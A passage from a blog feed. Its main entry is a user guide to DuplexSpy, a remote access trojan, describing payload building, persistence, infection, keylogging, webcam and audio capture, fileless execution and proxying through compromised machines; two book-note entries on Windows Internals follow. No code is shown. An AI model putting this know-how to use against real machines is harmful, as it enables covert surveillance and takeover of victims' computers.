data-src='/images/article/tools/duplexspy/listener/3.png'><img src="/images/article/tools/duplexspy/listener/3.png" width="400">    <figcaption>    Save configuration without SSL certificate file.    </figcaption></p><p>You can create a certificate file through <code>openssl</code> command or using DuplexSpy. </p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/listener/5.png'><img src="/images/article/tools/duplexspy/listener/5.png" width="400"></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/listener/6.png'><img src="/images/article/tools/duplexspy/listener/6.png" width="400"></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/listener/7.png'><img src="/images/article/tools/duplexspy/listener/7.png" width="700"></p><p>DuplexSpy checks the listener configuration before it shows. If a mal-config is detected. The state of your listener will be turned into <strong>unavailable</strong>.</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/listener/4.png'><img src="/images/article/tools/duplexspy/listener/4.png" width="700"></p><h2 id="Generate-a-Payload"><a href="#Generate-a-Payload" class="headerlink" title="Generate a Payload"></a>Generate a Payload</h2><p>DuplexSpy currently provides a single payload type. In the previous version, three different payload types were available, but issues were discovered in the other two. These will be addressed in a future release.</p><p>To generate a payload, click <strong>Build</strong> on the home page.</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/build/1.png'><img src="/images/article/tools/duplexspy/build/1.png" width="400"></p><h3 id="Persistence"><a href="#Persistence" class="headerlink" title="Persistence"></a>Persistence</h3><p>DuplexSpy provides two persistence methods. The first one is copy the payload to <strong>StartUp</strong> directory, and the second method is modifying the registry data. The latter method is called at the end of copying file.</p><h2 id="Infected"><a href="#Infected" class="headerlink" title="Infected"></a>Infected</h2><p>Like other remote access tools, the target can be infected by directly executing the <code>.exe</code> file. Once the remote machine is compromised and successfully connects to the server, it will appear as an available item on the home page.</p><p>If you see this, congratulations, you can now use the provided functions.</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/build/2.png'><img src="/images/article/tools/duplexspy/build/2.png" width="700"></p><p>The context menu displays all available functions.</p><h1 id="Manager"><a href="#Manager" class="headerlink" title="Manager"></a>Manager</h1><p>The <strong>Manager</strong> provides the following remote administration features:</p><ul><li>File Manager</li><li>Task Manager</li><li>Service Manager</li><li>Registry Editor</li><li>Connection View</li><li>Window Manager</li></ul><h2 id="File-Manager"><a href="#File-Manager" class="headerlink" title="File Manager"></a>File Manager</h2><p>The File Manager provides the following functions:</p><ul><li><strong>Show Image</strong></li><li><strong>New</strong></li><li><strong>Edit</strong></li><li><strong>Copy</strong></li><li><strong>Paste</strong></li><li><strong>Move</strong></li><li><strong>Delete</strong></li><li><strong>Upload</strong></li><li><strong>Download</strong></li><li><strong>WGET</strong></li><li><strong>Archive</strong></li><li><strong>Datetime</strong></li><li><strong>Shortcut</strong></li><li><strong>Copy Path</strong></li></ul><p>Toolbar functions:</p><ul><li><strong>Home</strong></li><li><strong>Parent</strong></li><li><strong>Refresh</strong></li><li><strong>New</strong></li><li><strong>Select</strong></li><li><strong>Execute</strong></li><li><strong>Shell</strong></li><li><strong>Find</strong></li></ul><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/manager/file.1.png'><img src="/images/article/tools/duplexspy/manager/file.1.png" width="700"></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/manager/file.2.png'><img src="/images/article/tools/duplexspy/manager/file.2.png" width="700"></p><h2 id="Task-Manager"><a href="#Task-Manager" class="headerlink" title="Task Manager"></a>Task Manager</h2><ul><li><strong>Injector</strong> – Perform DLL or shellcode injection, <a href="https://iss4cf0ng.github.io/2026/02/03/2026-2-3-DuplexSpyDllAndShellcode/">click this</a> to learn more about this feature.</li><li><strong>Start</strong>:</li><li><strong>Kill</strong></li><li><strong>Kill + Delete</strong></li><li><strong>Suspend</strong></li><li><strong>Resume</strong></li><li><strong>Copy</strong></li><li><strong>Find Antivirus</strong></li></ul><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/manager/task.1.png'><img src="/images/article/tools/duplexspy/manager/task.1.png" width="700"></p><h2 id="RegEdit"><a href="#RegEdit" class="headerlink" title="RegEdit"></a>RegEdit</h2><p>DuplexSpy implements a simple registry editor with a GUI similar to <code>regedit.exe</code></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/manager/reg.1.png'><img src="/images/article/tools/duplexspy/manager/reg.1.png" width="700"></p><h2 id="Service"><a href="#Service" class="headerlink" title="Service"></a>Service</h2><p>Displays all Windows services on the compromised machine.</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/manager/serv.1.png'><img src="/images/article/tools/duplexspy/manager/serv.1.png" width="700"></p><h2 id="Connection"><a href="#Connection" class="headerlink" title="Connection"></a>Connection</h2><p>Displays all active network connections.</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/manager/conn.1.png'><img src="/images/article/tools/duplexspy/manager/conn.1.png" width="700"></p><h2 id="Window"><a href="#Window" class="headerlink" title="Window"></a>Window</h2><p>Displays all open windows and provides the following features:</p><ul><li><strong>Capture</strong><ul><li><strong>GetDC</strong></li><li><strong>Foreground</strong></li></ul></li><li><strong>Go to TaskMgr</strong></li><li><strong>Copy</strong></li><li><strong>Thread</strong><ul><li><strong>Suspend</strong></li><li><strong>Resume</strong></li></ul></li></ul><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/manager/window.1.png'><img src="/images/article/tools/duplexspy/manager/window.1.png" width="700"></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/manager/window.2.png'><img src="/images/article/tools/duplexspy/manager/window.2.png" width="700"></p><h1 id="Terminal"><a href="#Terminal" class="headerlink" title="Terminal"></a>Terminal</h1><p>DuplexSpy provides two types of <code>cmd.exe</code> terminal and a WQL console.</p><h2 id="Virtual-Terminal"><a href="#Virtual-Terminal" class="headerlink" title="Virtual Terminal"></a>Virtual Terminal</h2><p>A traditional virtual terminal commonly found in RATs.</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/terminal/shell.png'><img src="/images/article/tools/duplexspy/terminal/shell.png" width="700"></p><h2 id="Xterm-Terminal"><a href="#Xterm-Terminal" class="headerlink" title="Xterm Terminal"></a>Xterm Terminal</h2><p>Inspired by <strong>MobaXterm</strong>, this terminal provides an interactive console supporting tools such as:</p><ul><li><code>nc.exe</code></li><li><code>python</code></li><li><code>nmap</code></li><li><code>sqlmap</code></li><li><code>ssh</code></li><li><code>telnet</code></li><li><code>netsh</code></li></ul><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/terminal/xterm.png'><img src="/images/article/tools/duplexspy/terminal/xterm.png" width="700"></p><h2 id="WQL"><a href="#WQL" class="headerlink" title="WQL"></a>WQL</h2><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/terminal/wql.png'><img src="/images/article/tools/duplexspy/terminal/wql.png" width="700"></p><h1 id="Desktop"><a href="#Desktop" class="headerlink" title="Desktop"></a>Desktop</h1><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/monitor/1.png'><img src="/images/article/tools/duplexspy/monitor/1.png" width="700"></p><h1 id="Webcam"><a href="#Webcam" class="headerlink" title="Webcam"></a>Webcam</h1><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/webcam/1.png'><img src="/images/article/tools/duplexspy/webcam/1.png" width="700"></p><h1 id="Audio"><a href="#Audio" class="headerlink" title="Audio"></a>Audio</h1><p>Captures audio streams from microphones or speakers. The received audio can be saved as an <code>.mp3</code> file.</p><h1 id="FunStuff"><a href="#FunStuff" class="headerlink" title="FunStuff"></a>FunStuff</h1><p>Inspired by the classic <strong>Beast RAT</strong>, this module provides a collection of interactive and demonstrative features, including:</p><ul><li><strong>MessageBox</strong></li><li><strong>Balloon Tips</strong></li><li><strong>Toggle</strong><ul><li><strong>Mouse</strong><ul><li>Hide / Show the mouse cursor</li><li>Lock / Unlock the mouse cursor</li><li>Enable / Disable mouse trails</li></ul></li><li><strong>hWnd</strong><ul><li>Hide / Show the system tray</li><li>Hide / Show the system clock</li><li>Hide / Show the taskbar</li><li>Hide / Show the Start Orb (the Start button at the lower-left corner of the screen)</li></ul></li><li><strong>Keyboard</strong><ul><li><strong>Smile</strong>: Replace all keyboard input with a smiley face. For example, typing <code>HelloWorld</code> will result in ten 😊 characters.</li><li>Enable / Disable keyboard input</li></ul></li></ul></li><li><strong>Image</strong><ul><li><strong>Wallpaper</strong>: Change or retrieve the current wallpaper of the compromised machine</li><li><strong>LockScreen</strong>: Display a specified image while disabling keyboard input and hiding the mouse cursor</li></ul></li></ul><h1 id="Proxy"><a href="#Proxy" class="headerlink" title="Proxy"></a>Proxy</h1><p>The <strong>Proxy</strong> feature is designed to demonstrate a common misconception: some people believe that compromising their computer is harmless because it contains no important data. This assumption is incorrect. Even if no sensitive data is present, a compromised machine can still be abused as a proxy to conceal the attacker’s real identity.</p><p>The <strong>Proxy</strong> function establishes a listener on the C2 server and accepts SOCKS5 connections from users. Network traffic is then forwarded through the compromised machine. The overall architecture is illustrated below:</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/proxy/10.png'><img src="/images/article/tools/duplexspy/proxy/10.png" width="1000"></p><p>This feature allows attackers to browse the internet, watch YouTube, or even perform <strong>SSH logins to remote servers</strong> through the compromised host.</p><p>To learn more, please <a href="https://iss4cf0ng.github.io/2026/02/03/2026-2-3-DuplexSpyProxy/">click here</a>.</p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Keylogger"><a href="#Keylogger" class="headerlink" title="Keylogger"></a>Keylogger</h2><p>Years ago, when I was a beginner in cybersecurity, I was curious about how a keylogger could endanger user credentials if it only logged keystrokes. Later, I realized that the issue lies in practical design rather than raw data itself.</p><p>DuplexSpy demonstrates how an offensive keylogger is implemented—not only recording the keys pressed by the user, but also capturing the timestamp and the active window title.</p><p align="center" class='item-img' data-src='https://raw.githubusercontent.com/iss4cf0ng/DuplexSpyCS/refs/heads/main/png/keylogger.png'><img src="https://raw.githubusercontent.com/iss4cf0ng/DuplexSpyCS/refs/heads/main/png/keylogger.png" width="700"></p><h2 id="Chat-Message"><a href="#Chat-Message" class="headerlink" title="Chat Message"></a>Chat Message</h2><p>This feature allows you to have a conversation with the user who is currently logged on to the compromised machine.<br>Currently, it supports single-user sessions and text messages only.</p><h2 id="Run-Script"><a href="#Run-Script" class="headerlink" title="Run Script"></a>Run Script</h2><p>Execute customized scripts. DuplexSpy provides three types of executable scripts:</p><ul><li>Batch</li><li>C#</li><li>VB.NET</li></ul><p>Both C# and VB.NET scripts are executed filelessly, while Batch scripts are not.</p><h2 id="PC-Power"><a href="#PC-Power" class="headerlink" title="PC Power"></a>PC Power</h2><p>This function includes:</p><ul><li>Restart</li><li>Logout</li><li>Shutdown</li><li>Sleep</li></ul><p>All actions will be executed after a specified delay.<br>Note that the compromised machine will be disconnected after the action is triggered.</p><h2 id="Fileless-Execution"><a href="#Fileless-Execution" class="headerlink" title="Fileless Execution"></a>Fileless Execution</h2><p>This feature allows you to execute a PE file without writing it to disk (<strong>fileless execution</strong>).</p><p>To learn more, please <a href="https://iss4cf0ng.github.io/2026/02/03/2026-2-3-DuplexSpyFilelessExec/">click this</a>.</p><h2 id="DLL-Loader"><a href="#DLL-Loader" class="headerlink" title="DLL Loader"></a>DLL Loader</h2><p>This feature writes a DLL to a temporary file (<code>%temp%</code>) and loads it using Win32 APIs.<br>Note that this feature is <strong>not fileless</strong>.</p><p>To learn more, please <a href="https://iss4cf0ng.github.io/2026/02/03/2026-2-3-DuplexSpyDllAndShellcode/">click this</a>.</p><h2 id="Shellcode-Loader"><a href="#Shellcode-Loader" class="headerlink" title="Shellcode Loader"></a>Shellcode Loader</h2><p>Load shellcode directly into memory. This feature <strong>IS FILELESS</strong>.</p><p>To learn more, please <a href="https://iss4cf0ng.github.io/2026/02/03/2026-2-3-DuplexSpyDllAndShellcode/">click this</a>.</p><h1 id="Plugin"><a href="#Plugin" class="headerlink" title="Plugin"></a>Plugin</h1><p>This feature allows you to load a .NET Framework 4.8 assembly into memory, pass parameters to it, and execute customized functions.</p><p>To learn more, please <a href="https://iss4cf0ng.github.io/2026/02/03/2026-2-3-DuplexSpyPlugin/">click this</a>.</p><h1 id="Batch"><a href="#Batch" class="headerlink" title="Batch"></a>Batch</h1><p>For convenience, DuplexSpy provides several features grouped under <strong>Batch</strong>.<br>These functions allow you to execute multiple operations or commands described above in a single workflow.</p><h2 id="Desktop-1"><a href="#Desktop-1" class="headerlink" title="Desktop"></a>Desktop</h2><p>This idea is inspired by CCTV monitoring systems.<br>Each page displays up to 9 desktops.</p><h2 id="Webcam-1"><a href="#Webcam-1" class="headerlink" title="Webcam"></a>Webcam</h2><p>This idea is also inspired by CCTV monitoring systems.<br>Each page displays up to 9 webcams. Unlike <strong>Multi-Desktop</strong>, webcam images are not displayed automatically.</p><h2 id="Lock-Screen"><a href="#Lock-Screen" class="headerlink" title="Lock Screen"></a>Lock Screen</h2><p>This idea comes from the comic <em>Keroro Gunso</em>.<br>In the story, an alien character hijacks multiple computers and displays a star logo while their team invades Earth.</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/lockscreen/1.png'><img src="/images/article/tools/duplexspy/lockscreen/1.png" width="700"></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/lockscreen/2.png'><img src="/images/article/tools/duplexspy/lockscreen/2.png" width="700"></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/lockscreen/3.png'><img src="/images/article/tools/duplexspy/lockscreen/3.png" width="700"></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/lockscreen/4.png'><img src="/images/article/tools/duplexspy/lockscreen/4.png" width="700"></p><h2 id="Run-Script-1"><a href="#Run-Script-1" class="headerlink" title="Run Script"></a>Run Script</h2><p>Send customized scripts to compromised machines.</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/runscript/1.png'><img src="/images/article/tools/duplexspy/runscript/1.png" width="700"></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/runscript/2.png'><img src="/images/article/tools/duplexspy/runscript/2.png" width="700"></p><h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p>Open a URL or download an executable from a specified URL.</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/url/1.png'><img src="/images/article/tools/duplexspy/url/1.png" width="700"></p><h1 id="Connection-1"><a href="#Connection-1" class="headerlink" title="Connection"></a>Connection</h1><ul><li><strong>Reconnect</strong>: Notify the remote computer to reconnect to the server.</li><li><strong>Disconnect</strong>: Notify the remote computer to disconnect from the server. The payload will be terminated.</li></ul><h1 id="Client"><a href="#Client" class="headerlink" title="Client"></a>Client</h1><ul><li><strong>Sleep</strong>: Disconnect from the C2 server and reconnect after a specified delay.</li><li><strong>Update</strong>: Send a new payload to the compromised machine, delete the old payload, and execute the new one (<strong>not fileless</strong>).</li><li><strong>Remove</strong>: Terminate and delete the payload on the compromised machine.</li></ul><h1 id="Local"><a href="#Local" class="headerlink" title="Local"></a>Local</h1><p>Some functions are executed on your server only:</p><ul><li><strong>Open Folder</strong>: When a compromised machine is online, DuplexSpy creates a dedicated folder for it. This feature allows you to open the folder via <code>explorer.exe</code>.</li><li><strong>Highlight</strong>: Highlight the selected items.</li></ul><h1 id="Copy"><a href="#Copy" class="headerlink" title="Copy"></a>Copy</h1><p>This function also runs on your server only.<br>It allows you to copy the online ID or IPv4 address to your clipboard.</p><h1 id="THANKS-FOR-READING"><a href="#THANKS-FOR-READING" class="headerlink" title="THANKS FOR READING!"></a>THANKS FOR READING!</h1><p align="center" class='item-img' data-src='/images/meme/mika_nagisa_rollcake.gif'><img src="/images/meme/mika_nagisa_rollcake.gif" width="400"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Preface&quot;&gt;&lt;a href=&quot;#Preface&quot; class=&quot;headerlink&quot; title=&quot;Preface&quot;&gt;&lt;/a&gt;Preface&lt;/h1&gt;&lt;p&gt;This document describes &lt;strong&gt;DuplexSpy&lt;/strong&gt;</summary>
      
    
    
    
    <category term="Tools&#92;DuplexSpy" scheme="http://example.com/categories/Tools-DuplexSpy/"/>
    
    
    <category term="Code" scheme="http://example.com/tags/Code/"/>
    
    <category term="C#" scheme="http://example.com/tags/C/"/>
    
    <category term="Program" scheme="http://example.com/tags/Program/"/>
    
    <category term="DuplexSpy" scheme="http://example.com/tags/DuplexSpy/"/>
    
    <category term="RAT" scheme="http://example.com/tags/RAT/"/>
    
  </entry>
  
  <entry>
    <title>[Book] Windows Internal Part 2</title>
    <link href="http://example.com/2026/01/26/2026-1-26-BookWindowsInternal-P2/"/>
    <id>http://example.com/2026/01/26/2026-1-26-BookWindowsInternal-P2/</id>
    <published>2026-01-26T03:30:22.000Z</published>
    <updated>2026-01-27T07:34:05.933Z</updated>
    
    <content type="html"><![CDATA[<h1 id="El-libro"><a href="#El-libro" class="headerlink" title="El libro"></a>El libro</h1><p align="center" class='item-img' data-src='/images/books/WindowsInternal2/libro.jpg'><img src="/images/books/WindowsInternal2/libro.jpg" width="500"></p><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>This article is used to keep notes and summaries of the book “Windows Internal Part 2”.<br>The content will be continuously updated as I read through the book.</p><h1 id="Reflection"><a href="#Reflection" class="headerlink" title="Reflection"></a>Reflection</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;El-libro&quot;&gt;&lt;a href=&quot;#El-libro&quot; class=&quot;headerlink&quot; title=&quot;El libro&quot;&gt;&lt;/a&gt;El libro&lt;/h1&gt;&lt;p align=&quot;center&quot; class=&#39;item-img&#39; data-src=&#39;/ima</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>[Book] Windows Internal Part 1</title>
    <link href="http://example.com/2026/01/26/2026-1-26-BookWindowsInternal-P1/"/>
    <id>http://example.com/2026/01/26/2026-1-26-BookWindowsInternal-P1/</id>
    <published>2026-01-26T03:29:20.000Z</published>
    <updated>2026-01-29T10:56:48.047Z</updated>
    
    <content type="html"><![CDATA[<h1 id="El-libro"><a href="#El-libro" class="headerlink" title="El libro"></a>El libro</h1><p align="center" class='item-img' data-src='/images/books/WindowsInternal1/libro.jpg'><img src="/images/books/WindowsInternal1/libro.jpg" width="500"></p><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>This article is used to keep notes and summaries of the book “Windows Internal Part 1”.<br>The content will be continuously updated as I read through the book.</p><h1 id="Reflection"><a href="#Reflection" class="headerlink" title="Reflection"></a>Reflection</h1><h1 id="Chapter-1-Concepts-and-Tools"><a href="#Chapter-1-Concepts-and-Tools" class="headerlink" title="Chapter 1 - Concepts and Tools"></a>Chapter 1 - Concepts and Tools</h1><h2 id="Fundation-concepts-and-terms"><a href="#Fundation-concepts-and-terms" class="headerlink" title="Fundation concepts and terms"></a>Fundation concepts and terms</h2><h3 id="Windows-API"><a href="#Windows-API" class="headerlink" title="Windows API"></a>Windows API</h3><p>The Windows application programming interface (API) is the user-mode system programming interface to the Windows OS family. Prior to the introduction of 64-bit versions of Windows, the API to the 32-bit versions of the Windows OS was called the Win32 API to distinguish it from the original 16-bit Windows API.</p><p>The term Windows API refers to both the 32-bit and 64-bit API to Windows.</p><h3 id="Windows-API-flavors"><a href="#Windows-API-flavors" class="headerlink" title="Windows API flavors"></a>Windows API flavors</h3><p>COM was originally created to enable Microsoft Office applications to communicate and exchange data between documents (such as embedding an Excel chart inside a Word document or a PowerPoint presentation). This ability is called Object Linking and Embedding (OLE). OLE was originally implemented using an old Windows messaging mechanism called Dynamic Data Exchange (DDE).</p><p>COM is baed on two foundational principles. First, client communicate with objects (sometimes called COM server object) through interfaces——well-defined contracts with a set of logically related methods grouped under the virtual table dispatch mechanism, wich is also a common way for C++ compilers to implement virtual functions dispatch.<br>The second principle is that component implementation is loaded dynamically rather than being statically linked to the client.</p><p>The term COM server typically refers to a Dynamic Link Library (DLL) or an executable (EXE) where the COM classes are implemented.</p><h3 id="The-Windows-Runtime"><a href="#The-Windows-Runtime" class="headerlink" title="The Windows Runtime"></a>The Windows Runtime</h3><p>Windows 8 introduced a new API and supporting runtime called Windows Runtime (sometimes abbreviated WinRT, not to be confused with Windows RT, the discontinued ARM-based Windows OS version).</p><p>From an API perspective, WInRT is built on top of COM, adding various extensions to the base COM infrastructure.</p><p><strong>The .NET Framework</strong><br>The .NET Framework is part of Windows.</p><div class="table-container"><table><thead><tr><th>Windows Version</th><th>.NET Framework Version</th></tr></thead><tbody><tr><td>Windows 8</td><td>4.5</td></tr><tr><td>Windows 8.1</td><td>4.5.1</td></tr><tr><td>Windows 10</td><td>4.6</td></tr><tr><td>Windows 10 version 1511</td><td>4.6.1</td></tr><tr><td>Windows 10 version 1607</td><td>4.6.2</td></tr></tbody></table></div><p>The .NET Framework consists of two major components:</p><ul><li><strong>The Common Language Runtime (CLT)</strong></li><li><strong>The .NET Framework Class Library (FCL)</strong></li></ul><p align="center" class='item-img' data-src='/images/books/WindowsInternal1/1.1.png'><img src="/images/books/WindowsInternal1/1.1.png" width="600"></p><h3 id="Services-functions-and-routines"><a href="#Services-functions-and-routines" class="headerlink" title="Services, functions, and routines"></a>Services, functions, and routines</h3><ul><li><strong>Windows API functions</strong></li><li><strong>Native system service (or system calls)</strong></li><li><strong>Kernel support functions (or routines)</strong></li></ul><h3 id="Processes"><a href="#Processes" class="headerlink" title="Processes"></a>Processes</h3><p>Although programs and process appear similar on the surface, they are fundamentally different.</p><p>A <em>program</em> is a static sequence of instructions, whereas a <em>process</em> is a container for a set of resources used when executing the instance of the program.</p><ul><li><strong>A private virtual address space</strong></li><li><strong>An executable program</strong></li><li><strong>A list of open handles</strong></li><li><strong>A security context</strong></li><li><strong>A process ID</strong></li><li><strong>At least one thread of execution</strong></li></ul><h3 id="Threads"><a href="#Threads" class="headerlink" title="Threads"></a>Threads</h3><p>A <em>thread</em> is an entity within a process that Windows schedules for execution. Without it, the process’s program can’t run. A thread includes the follow essential components:</p><ul><li>The contents of a set of CPU registers representing the state of the processor</li><li>Two stacks——one for the thread to use while executing in kernel mode and one for executing in user mode.</li><li>A private storage area called <em>thread-lcoal storage (TLS)*</em> for use by subsystems, run-time libraries, and DLLs.</li><li>A unique identifier called a <em>thread ID</em> (part of an internal structure called a <em>client ID</em>; process IDs and thread IDs are generated out of the same namespace, so they never overlap)</li></ul><p>The threads of a 32-bit application running on a 64-bit version of WIndows will contain both 32-bit and 64-bit context, which Wow64 will use to switch the applicaion from running in 32-bit to 64-bit mode when required. These threads will have two user stacks and two <strong>CONTEXT</strong> blocks, and the usual Windows API functions will return the 64-bit context instead. The <code>Wow64GetThreadContext</code> function, however, will return the 32-bit context.</p><h4 id="Fibers"><a href="#Fibers" class="headerlink" title="Fibers"></a>Fibers</h4><p>Fibers allow an application to schedule its own threads of execution rather than rely on the priority-based scheduling mechanism built into Windows. Fibers are often called <em>lightweight threads</em>. In terms of scheduling, they are invisible to the kernel because they are implementeed in user mode in <code>kernel32.dll</code>. To use fibers, you first make a call to the Windows <code>ConvertThreadToFiber</code> function. This function converts the thread to a running fiber. Afterward, the newly converted fiber can create additonal fibers via the <code>CreateFiber</code> function (Each fiber can have its own set of fibers).</p><h4 id="User-mode-scheduling-threads"><a href="#User-mode-scheduling-threads" class="headerlink" title="User-mode scheduling threads"></a>User-mode scheduling threads</h4><p>User-mode schedulnig (UMS) threads, which are available only on 64-bit versions of Windows, provide the same basic advantages as fibers——and only a few of the disadvantages. UMS threads have their own kernel thread stat and are therefore visible to the kernel, which allows multiple UMS threads to issue blocking system calls and share and contend on resources.</p><p align="center" class='item-img' data-src='/images/books/WindowsInternal1/1.2.png'><img src="/images/books/WindowsInternal1/1.2.png" width="600"></p><h3 id="Jobs"><a href="#Jobs" class="headerlink" title="Jobs"></a>Jobs</h3><p>Windows provides an extension to the process model called a <em>job</em>. A job object’s main function is to allow the management and manipulation of groups of processes as a unit.</p><p>A job object allows control of certain attributes and provides limits for the process or processes associated with the job.</p><h3 id="Virtual-Memory"><a href="#Virtual-Memory" class="headerlink" title="Virtual Memory"></a>Virtual Memory</h3><p align="center" class='item-img' data-src='/images/books/WindowsInternal1/1.3.png'><img src="/images/books/WindowsInternal1/1.3.png" width="600"></p><p>Windows implements a virtual memory system based on a flat (linear) address space that provides each process with the illusion of having its own large, private address space.</p><p>Virtual memory provides a logical view of memory that might not correspond to its physical layout.</p><p align="center" class='item-img' data-src='/images/books/WindowsInternal1/1.4.png'><img src="/images/books/WindowsInternal1/1.4.png" width="600"></p><h3 id="Kernel-mode-vs-user-mode"><a href="#Kernel-mode-vs-user-mode" class="headerlink" title="Kernel mode vs. user mode"></a>Kernel mode vs. user mode</h3><p>To protect user applications from accessing and/or modifying critical OS data, Windows uses two processor access modes (even if the processor on which Windows is running supports more than two): <strong>user mode</strong> and <strong>kernel mode</strong>. User application code runs in user mode, whereas OS code (such as system services and device drivers) runs in kernel mode.</p><p>Kernel mode refers to a mode of execution in a processor that grants access to all system memory and all CPU instructions.</p><p>Although each Windows process has its own private memory space, the kernel-mode OS and device-driver code share a single virtual address space. Each page in virtual memory is tagged to indicate what access mode the processor must be in to read and/or write the page.</p><p>Pages in system space can be accessed only from kernel mode, whereas all pages in the user address space are accessible from user mode and kernel mode.</p><p>Windows 10 drivers must be signed by only two of the accepted certification authorities with a SHA-2 Extended Validation (EV) Hwardware certificate instead of the regular file-based SHA-1 certiicate and its 20 authorities.</p><h3 id="Hypervisor"><a href="#Hypervisor" class="headerlink" title="Hypervisor"></a>Hypervisor</h3><p>The need for fast, efficient, and secure virtualization has driven new models of computing and reasoning about software.</p><p>To provide such virtualization services, almost all modern solutions employ the use of a <strong>hypervisor</strong>, which is a specialized and highly privileged component that allows for the virtualization and isolation of all resources on the machine, from virtual to physical memory, to device interrupts, and even to PCI and USB devices.</p><p>In Windows 10, Microsoft now leverages the Hyper-V hypervisor to provide a new set of services known as <strong>virtualization-based security (VBS)</strong>:</p><ul><li><strong>Device Guard</strong>: This provides Hypervisor Code Integrity (HVCI) for stronger code-signing guaratees over KMCS alone, and allows for the custumization of the signature policy of the Windows OS, for both user-mode and kernel mode code.</li><li><strong>Hyper Guard</strong>: This protects key kernel-related and hypervisor-related data structures and code.</li><li><strong>Credential Guard</strong>: This prevents unauthorized access to domain account credentials and secrets, combined with secure biometrics.</li><li><strong>Application Guard</strong>: This provides an even stronger sandbox for the Microsoft Edge browser.</li><li><strong>Host Guardian and Shielded Fabric</strong>: These leverage a virtual TPM (v-TPM) to protect a virtual machine from the infrastructure it’s running on.</li></ul><p>Additionally, the Hyper-V hypervisor enables certain key kernel mitigations against exploits and other attackers.</p><h3 id="Firmware"><a href="#Firmware" class="headerlink" title="Firmware"></a>Firmware</h3><h3 id="Terminal-Services-and-multiple-sessions"><a href="#Terminal-Services-and-multiple-sessions" class="headerlink" title="Terminal Services and multiple sessions"></a>Terminal Services and multiple sessions</h3><p><strong>Terminal Services</strong> refers to the support in Windows for multiple interactive user sessions on a single systerm.</p><p>With Windows Terminal Services, a remote user can establish a session on another machine, log in, and run applications on the server.</p><p>The first session is considered the services session, or session zero, and contains system service hosing processes.</p><h3 id="Objects-and-handles"><a href="#Objects-and-handles" class="headerlink" title="Objects and handles"></a>Objects and handles</h3><p>In the Windows OS, a <strong>kernel object</strong> is a single, run-time instance of a statically defined object type. An <strong>object type</strong> comprises a system-defined data type, functions that operate on instances of the data type, and a set of object attributes.</p><p>The most fundamental difference between an object and an ordinary data structure is that the internal structure of an object is opaque. You must call an object service to get data out of or put data into an object. You can’t directly read or change data in side an object.</p><p>Objects, through the help of a kernel component called the <strong>object manager</strong>.</p><p>Not all data structures in the Windows OS are objects. Only data that needs to be shared, protected, named, or made visible to user-mode programs (via system services) is placed in objects. Structures used by only one component of the OS to implement internal functions are not objects.</p><h3 id="Security"><a href="#Security" class="headerlink" title="Security"></a>Security</h3><p>Windows has three forms of access control over objects:</p><ul><li><strong>Discretionary access control</strong>: It’s the method by which owners of objects (such as files or printers) grant or deny access to others. With Windows Server 2012 and Windows 8, this form of discretionary control is further improved by implementing attribute-based access control (also called Dynamic Access Control).</li><li><strong>Privileged access control</strong>: This is necessary for those times when discretionary access control is not enough. It’s a method of ensuring that someone can get to protected objects if the owner isn’t available.</li><li><strong>Mandatory integrity control</strong>: This is required when an additional level of security control is needed to protect objects that are being accessed from within the same user account.</li></ul><p>Starting with Windows 8, a sandbox called an <strong>AppContainer</strong> is used to host Windows Apps, which provides isolation with relation to other AppContainers and non-Windows Apps processes.</p><h3 id="Registry"><a href="#Registry" class="headerlink" title="Registry"></a>Registry</h3><h3 id="Unicode"><a href="#Unicode" class="headerlink" title="Unicode"></a>Unicode</h3><h1 id="Chapter-2-System-architecture"><a href="#Chapter-2-System-architecture" class="headerlink" title="Chapter 2 - System architecture"></a>Chapter 2 - System architecture</h1><h2 id="Operating-system-model"><a href="#Operating-system-model" class="headerlink" title="Operating system model"></a>Operating system model</h2><h2 id="Architecture-overview"><a href="#Architecture-overview" class="headerlink" title="Architecture overview"></a>Architecture overview</h2><p>Despite its pervasive use of objects to represent shared system resources, Windows is not an object-oriented system in the strict sense. Most of the kernel-mdoe OS code is written in C for portability. The C programming language doesn’t directly support object-oriented constructs such as polymorphic functions or class inheritance. Therefore, the C-based implementation of objects in Windows borrows from, but doesn’t depend on, features of particular object-oriented languages.</p><p align="center" class='item-img' data-src='/images/books/WindowsInternal1/2.1.png'><img src="/images/books/WindowsInternal1/2.1.png" width="600"></p><p>The boexes above the line represent user-mode processes, and the components below the line are kernel-mode OS services.</p><p>A second dividing line between kernel-mode parts of Windwos and the hypervisor is also visible. The hypervisor still runs with the same CPU privilege level (0) as the kernel, but because it uses specialized CPU instructions (VT-x on Intel, SVM on AMD), it can both isolate itself from the kernel while also monitoring it (and applications). 